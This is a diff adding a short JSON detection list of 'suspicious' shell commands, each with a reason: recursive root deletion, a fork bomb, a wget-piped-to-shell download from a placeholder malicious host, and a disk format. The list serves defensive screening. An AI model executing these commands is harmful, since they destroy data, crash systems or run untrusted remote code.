@@ -1,0 +1,20 @@
+{
+  "suspicious_patterns": [
+    {
+      "command": "rm -rf /",
+      "reason": "Deletes all files in the root directory"
+    },
+    {
+      "command": ":(){ :|: & };:",
+      "reason": "Fork bomb — causes system crash by infinite loop"
+    },
+    {
+      "command": "wget http://malicious.site/script.sh | sh",
+      "reason": "Downloads and runs an untrusted script"
+    },
+    {
+      "command": "mkfs.ext4 /dev/sda",
+      "reason": "Formats the disk — very dangerous"
+    }
+  ]
+}
